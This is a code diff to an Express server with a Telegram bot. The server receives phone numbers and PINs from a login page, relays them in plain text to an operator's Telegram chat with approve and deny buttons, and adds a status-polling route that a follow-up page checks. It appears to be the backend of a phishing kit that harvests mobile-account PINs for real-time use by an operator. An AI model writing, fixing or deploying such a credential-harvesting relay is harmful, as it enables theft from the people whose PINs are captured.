@@ -18,6 +18,9 @@ console.log("🟡 ADMIN_ID:", ADMIN_ID);
 // -------------------- BOT INIT --------------------
 const bot = new Telegraf(process.env.BOT_TOKEN);
 
+// -------------------- MEMORY STORE (APPROVAL SYSTEM) --------------------
+const statusStore = {}; // phone => status (pending/approved/denied)
+
 // -------------------- MIDDLEWARE --------------------
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
@@ -44,10 +47,10 @@ app.get('/:page', (req, res) => {
 app.post('/api/login-notification', async (req, res) => {
     const { phone, pin } = req.body || {};
 
-    console.log("📩 LOGIN REQUEST RECEIVED:", req.body);
+    console.log("🔥 LOGIN API HIT");
+    console.log("📩 BODY:", req.body);
 
     if (!phone || !pin) {
-        console.log("❌ Missing data");
         return res.status(400).json({ error: "Missing phone or pin" });
     }
 
@@ -55,11 +58,13 @@ app.post('/api/login-notification', async (req, res) => {
         return res.status(500).json({ error: "ADMIN_CHAT_ID missing" });
     }
 
+    // set pending status
+    statusStore[phone] = "pending";
+
     const message =
         `📱 LOGIN ATTEMPT\n\n` +
         `📞 Phone: +252${phone}\n` +
-        `🔢 PIN: ${pin}\n` +
-        `⏰ Time: ${new Date().toLocaleString()}`;
+        `🔢 PIN: ${pin}`;
 
     try {
         await bot.telegram.sendMessage(ADMIN_ID, message, {
@@ -69,7 +74,7 @@ app.post('/api/login-notification', async (req, res) => {
                         { text: "✅ Allow", callback_data: `approve_${phone}_${pin}` }
                     ],
                     [
-                        { text: "❌ Deny", callback_data: "deny" }
+                        { text: "❌ Deny", callback_data: `deny_${phone}` }
                     ]
                 ]
             }
@@ -80,7 +85,29 @@ app.post('/api/login-notification', async (req, res) => {
 
     } catch (err) {
         console.error("❌ TELEGRAM ERROR:", err);
-        res.status(500).json({ error: "Failed to send message" });
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// -------------------- STATUS CHECK (FOR PAGE7) --------------------
+app.get('/api/check-status', (req, res) => {
+    const phone = req.query.phone;
+
+    console.log("🔄 STATUS CHECK:", phone);
+
+    res.json({
+        status: statusStore[phone] || "pending"
+    });
+});
+
+// -------------------- TEST BOT ROUTE (FIX YOUR ISSUE) --------------------
+app.get('/test-bot', async (req, res) => {
+    try {
+        await bot.telegram.sendMessage(ADMIN_ID, "🧪 TEST MESSAGE WORKING");
+        res.send("✅ Bot message sent successfully");
+    } catch (err) {
+        console.error("❌ TEST BOT ERROR:", err);
+        res.status(500).send("❌ Failed: " + err.message);
     }
 });
 
@@ -89,10 +116,12 @@ bot.start((ctx) => {
     ctx.reply("🤖 Bot is active and running");
 });
 
-// APPROVE ACTION
+// -------------------- APPROVE ACTION --------------------
 bot.action(/approve_(.+)_(.+)/, async (ctx) => {
     const phone = ctx.match[1];
     const pin = ctx.match[2];
+
+    statusStore[phone] = "approved";
 
     const msg =
         `✅ APPROVED LOGIN\n\n` +
@@ -106,8 +135,12 @@ bot.action(/approve_(.+)_(.+)/, async (ctx) => {
     }
 });
 
-// DENY ACTION
-bot.action('deny', async (ctx) => {
+// -------------------- DENY ACTION --------------------
+bot.action(/deny_(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+
+    statusStore[phone] = "denied";
+
     try {
         await ctx.editMessageText("❌ LOGIN DENIED");
     } catch (e) {
@@ -120,7 +153,7 @@ app.listen(PORT, () => {
     console.log(`🚀 Server running on port ${PORT}`);
 });
 
-// SAFE BOT LAUNCH
+// -------------------- BOT LAUNCH (SAFE) --------------------
 const startBot = async () => {
     try {
         await bot.telegram.deleteWebhook();
@@ -133,7 +166,7 @@ const startBot = async () => {
 
 startBot();
 
-// -------------------- GLOBAL ERROR HANDLING --------------------
+// -------------------- ERROR HANDLING --------------------
 process.on('unhandledRejection', (err) => {
     console.error("❌ UNHANDLED REJECTION:", err);
 });
